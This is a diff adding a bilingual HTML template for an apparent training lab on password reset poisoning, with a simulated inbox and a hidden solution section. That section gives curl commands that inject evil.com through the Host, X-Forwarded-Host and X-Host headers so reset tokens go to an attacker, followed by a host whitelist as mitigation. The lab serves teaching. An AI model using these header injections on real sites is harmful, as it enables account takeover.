@@ -1,0 +1,208 @@
+{% extends "base.html" %}
+{% block title %}Password Reset Poisoning – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <div class="lab-description">
+      <div class="lang-content" data-lang="es">
+        <p class="text-sm text-gray-600 dark:text-gray-400 mb-2">
+          El servidor construye la URL del email de reset usando el header <code>Host</code> (u otros headers de override)
+          sin validación. Si el atacante inyecta un dominio malicioso, la víctima recibe un enlace
+          que apunta al servidor del atacante y el token queda expuesto.
+        </p>
+        <p class="text-xs text-gray-500">
+          {% if difficulty == 'easy' %}Tip: intenta modificar el header <code>Host</code> con Burp Suite.
+          {% elif difficulty == 'medium' %}Tip: el servidor confía en <code>X-Forwarded-Host</code> si está presente.
+          {% else %}Tip: busca otros headers de override de host (<code>X-Host</code>).{% endif %}
+        </p>
+      </div>
+      <div class="lang-content" data-lang="en" style="display:none">
+        <p class="text-sm text-gray-600 dark:text-gray-400 mb-2">
+          The server builds the reset email URL using the <code>Host</code> header (or other override headers)
+          without validation. If an attacker injects a malicious domain, the victim receives a link
+          pointing to the attacker's server and the token is exposed.
+        </p>
+        <p class="text-xs text-gray-500">
+          {% if difficulty == 'easy' %}Tip: try modifying the <code>Host</code> header with Burp Suite.
+          {% elif difficulty == 'medium' %}Tip: the server trusts <code>X-Forwarded-Host</code> if present.
+          {% else %}Tip: look for other host override headers (<code>X-Host</code>).{% endif %}
+        </p>
+      </div>
+    </div>
+  </div>
+
+  {% if flag %}
+  <div class="hl-card mb-4" style="border-color:rgba(34,197,94,.4);background:rgba(34,197,94,.06)">
+    <div class="text-sm font-semibold text-green-400 mb-1">
+      <span class="lang-content" data-lang="es">Token capturado — contraseña comprometida</span>
+      <span class="lang-content" data-lang="en" style="display:none">Token captured — password compromised</span>
+    </div>
+    <code class="text-sm font-mono text-green-400">{{ flag }}</code>
+  </div>
+  {% endif %}
+
+  {% if error %}
+  <div class="hl-card mb-4" style="border-color:rgba(239,68,68,.3)">
+    <div class="text-xs text-red-400 font-mono">{{ error }}</div>
+  </div>
+  {% endif %}
+
+  {% if last_poisoned %}
+  <div class="hl-card mb-4" style="border-color:rgba(239,68,68,.4);background:rgba(239,68,68,.06)">
+    <div class="text-xs font-semibold text-red-400 mb-1">
+      <span class="lang-content" data-lang="es">Ataque exitoso — el link de reset apunta a tu servidor</span>
+      <span class="lang-content" data-lang="en" style="display:none">Attack successful — the reset link points to your server</span>
+    </div>
+    <code class="text-xs font-mono text-red-300 break-all">{{ last_link }}</code>
+  </div>
+  {% endif %}
+
+  <!-- Reset request form -->
+  <div class="hl-card mb-4">
+    <h2 class="text-sm font-semibold mb-4" style="color:var(--hl-primary)">
+      <span class="lang-content" data-lang="es">Solicitar restablecimiento de contraseña</span>
+      <span class="lang-content" data-lang="en" style="display:none">Request password reset</span>
+    </h2>
+    <form method="POST" action="/reset_poisoning/request" class="space-y-4">
+      <div>
+        <label class="block text-xs text-gray-500 mb-1">Email</label>
+        <input type="text" name="email" value="victim@example.com"
+               class="hl-input font-mono" autocomplete="off">
+      </div>
+      <button type="submit" class="btn-primary">
+        <span class="lang-content" data-lang="es">Enviar enlace de reset</span>
+        <span class="lang-content" data-lang="en" style="display:none">Send reset link</span>
+      </button>
+    </form>
+  </div>
+
+  <!-- Simulated inbox -->
+  {% if inbox %}
+  <div class="hl-card mb-4">
+    <div class="flex items-center justify-between mb-3">
+      <h2 class="text-sm font-semibold" style="color:var(--hl-primary)">
+        <span class="lang-content" data-lang="es">Bandeja de entrada simulada</span>
+        <span class="lang-content" data-lang="en" style="display:none">Simulated inbox</span>
+      </h2>
+      <form method="POST" action="/reset_poisoning/clear">
+        <button type="submit" class="text-xs px-2 py-1 rounded font-mono"
+                style="background:rgba(255,255,255,.05);color:#6b7280;border:1px solid rgba(255,255,255,.1)">
+          <span class="lang-content" data-lang="es">Limpiar</span>
+          <span class="lang-content" data-lang="en" style="display:none">Clear</span>
+        </button>
+      </form>
+    </div>
+
+    <div class="space-y-2">
+      {% for email in inbox | reverse %}
+      <div style="background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:8px;padding:12px;font-family:monospace;font-size:12px">
+        <div class="flex items-center justify-between mb-1">
+          <div style="color:#94a3b8"><span style="color:#64748b">To:</span> {{ email.to }}</div>
+          <div class="flex items-center gap-2">
+            <span style="color:#475569;font-size:10px">{{ email.timestamp }}</span>
+            {% if email.poisoned %}
+            <span style="background:rgba(239,68,68,.15);color:#f87171;font-size:10px;padding:1px 6px;border-radius:4px;font-weight:600">POISONED</span>
+            {% else %}
+            <span style="background:rgba(34,197,94,.12);color:#4ade80;font-size:10px;padding:1px 6px;border-radius:4px;font-weight:600">SAFE</span>
+            {% endif %}
+          </div>
+        </div>
+        <div style="color:#64748b;margin-bottom:6px"><span style="color:#64748b">Subject:</span> <span style="color:#94a3b8">Password Reset Request</span></div>
+        <div style="color:#64748b;margin-bottom:4px">
+          <span class="lang-content" data-lang="es">Haz clic en el enlace para restablecer tu contraseña:</span>
+          <span class="lang-content" data-lang="en" style="display:none">Click the link to reset your password:</span>
+        </div>
+        <div style="margin-left:8px">
+          <a href="{{ email.link }}"
+             class="break-all"
+             style="color:{% if email.poisoned %}#f87171{% else %}#4ade80{% endif %}">{{ email.link }}</a>
+        </div>
+        {% if email.poisoned %}
+        <div style="margin-top:6px;font-size:10px;color:#ef4444">
+          <span class="lang-content" data-lang="es">Host inyectado: <code>{{ email.host_used }}</code></span>
+          <span class="lang-content" data-lang="en" style="display:none">Injected host: <code>{{ email.host_used }}</code></span>
+        </div>
+        {% endif %}
+      </div>
+      {% endfor %}
+    </div>
+  </div>
+  {% endif %}
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Easy — Envenenamiento via header Host</h3>
+    <p>El servidor construye la URL de reset como <code>f"http://{request.host}/reset_poisoning/confirm/{token}"</code>.<br>
+    Si modificas el header Host en la petición, el link generado usará tu dominio.</p>
+    <ol>
+      <li>Intercepta <code>POST /reset_poisoning/request</code> con Burp Suite.</li>
+      <li>Reemplaza el header <code>Host: TARGET_IP</code> por <code>Host: evil.com</code>.</li>
+      <li>El email generado contendrá <code>http://evil.com/reset_poisoning/confirm/TOKEN</code>.</li>
+      <li>Si la víctima hace clic, el token llega a tu servidor.</li>
+    </ol>
+    <pre>curl -X POST http://{{ target_ip }}/reset_poisoning/request \
+  -H "Host: evil.com" \
+  -d "email=victim@example.com"</pre>
+
+    <h3>Medium — Envenenamiento via X-Forwarded-Host</h3>
+    <p>El Host está validado, pero el servidor confía en <code>X-Forwarded-Host</code> (typical en proxies inversos mal configurados).</p>
+    <pre>curl -X POST http://{{ target_ip }}/reset_poisoning/request \
+  -H "X-Forwarded-Host: evil.com" \
+  -d "email=victim@example.com"</pre>
+
+    <h3>Hard — Envenenamiento via X-Host</h3>
+    <p>Ambos headers anteriores son ignorados. El servidor también procesa <code>X-Host</code>, que simula un proxy legacy que reescribe el host.</p>
+    <pre>curl -X POST http://{{ target_ip }}/reset_poisoning/request \
+  -H "X-Host: evil.com" \
+  -d "email=victim@example.com"</pre>
+    <p>Una vez que el link envenenado está en la bandeja, haz clic en él para que el servidor lo procese y entregue la flag.</p>
+
+    <h3>Mitigación</h3>
+    <pre># Configurar una whitelist de hosts permitidos
+ALLOWED_HOSTS = ['myapp.com', 'www.myapp.com']
+if request.host not in ALLOWED_HOSTS:
+    abort(400)</pre>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Easy — Poisoning via Host header</h3>
+    <p>The server builds the reset URL as <code>f"http://{request.host}/reset_poisoning/confirm/{token}"</code>.<br>
+    If you modify the Host header in the request, the generated link will use your domain.</p>
+    <ol>
+      <li>Intercept <code>POST /reset_poisoning/request</code> with Burp Suite.</li>
+      <li>Replace the <code>Host: TARGET_IP</code> header with <code>Host: evil.com</code>.</li>
+      <li>The generated email will contain <code>http://evil.com/reset_poisoning/confirm/TOKEN</code>.</li>
+      <li>When the victim clicks, the token is sent to your server.</li>
+    </ol>
+    <pre>curl -X POST http://{{ target_ip }}/reset_poisoning/request \
+  -H "Host: evil.com" \
+  -d "email=victim@example.com"</pre>
+
+    <h3>Medium — Poisoning via X-Forwarded-Host</h3>
+    <p>The Host is validated, but the server trusts <code>X-Forwarded-Host</code> (typical in misconfigured reverse proxies).</p>
+    <pre>curl -X POST http://{{ target_ip }}/reset_poisoning/request \
+  -H "X-Forwarded-Host: evil.com" \
+  -d "email=victim@example.com"</pre>
+
+    <h3>Hard — Poisoning via X-Host</h3>
+    <p>Both previous headers are ignored. The server also processes <code>X-Host</code>, simulating a legacy proxy that rewrites the host.</p>
+    <pre>curl -X POST http://{{ target_ip }}/reset_poisoning/request \
+  -H "X-Host: evil.com" \
+  -d "email=victim@example.com"</pre>
+    <p>Once the poisoned link is in the inbox, click it so the server processes it and delivers the flag.</p>
+
+    <h3>Mitigation</h3>
+    <pre>ALLOWED_HOSTS = ['myapp.com', 'www.myapp.com']
+if request.host not in ALLOWED_HOSTS:
+    abort(400)</pre>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span></div>
+  </div>
+</div>
+{% endblock %}
